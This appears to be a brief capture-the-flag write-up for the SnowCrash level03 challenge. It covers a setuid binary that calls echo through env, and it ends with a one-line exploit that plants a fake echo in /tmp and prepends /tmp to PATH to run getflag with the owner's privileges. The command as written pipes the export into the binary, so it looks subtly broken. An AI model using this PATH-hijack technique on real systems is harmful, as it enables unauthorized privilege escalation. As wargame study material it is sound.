level03@SnowCrash:~$ ls -la level03
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

The user level03 can execute the binary file withe the same permission as flag03

in the same time we have withe :  nm level03 
[
         U getegid@@GLIBC_2.0
         U geteuid@@GLIBC_2.0
080484a4 T main
         U setresgid@@GLIBC_2.0   real uid <udi of user level03> 
         U setresuid@@GLIBC_2.0   effective UID  <udi of flag03 the owner of the file>
         U system@@GLIBC_2.0
]

The most importante here, is the manipulation of the uid value,
that let user change his uid and probably take the uid of the creator of the file

We can see that the programe is printing text using the echo 
So we can override the PATH variable to point to a directory with our custom version of echo and since echo is executed using env, it isn't treated as a built-in

so

echo '/bin/getflag' >> /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games | ./level03
